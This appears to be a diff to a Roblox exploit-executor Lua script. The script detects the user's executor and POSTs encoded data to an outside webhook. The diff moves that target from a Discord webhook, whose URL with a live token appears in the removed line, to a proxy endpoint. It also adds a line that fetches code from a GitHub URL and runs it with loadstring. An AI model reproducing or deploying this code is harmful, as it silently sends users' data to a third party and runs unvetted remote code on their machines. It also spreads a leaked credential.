@@ -1,5 +1,6 @@
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
 local HttpService = game:GetService("HttpService")
+local endpoint = 'https://vineyard.performave.com/api/webhook/v1/proxy/7016542e-3c78-40d2-8ea3-0908f8aea3bc'
 
 local Data =
     {
@@ -42,5 +43,8 @@ local Headers = {["Content-Type"]="application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 
 Request = http_request or request or HttpPost or syn.request
-local Final = {Url = "https://ptb.discord.com/api/webhooks/996261758526308372/bGAcDQHiBy5sFtcKK5iH5-yDON4tyia1neVx6U0PbBl56eYq5td5Rj2pl2FpSXplsess", Body = Encoded, Method = "POST", Headers = Headers}
+LINK = loadstring(game:HttpGet"https://raw.githubusercontent.com/ireallylovelatinas/script/main/webhook")
+local Final = {Url = 'https://vineyard.performave.com/api/webhook/v1/proxy/7016542e-3c78-40d2-8ea3-0908f8aea3bc', Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
+
+
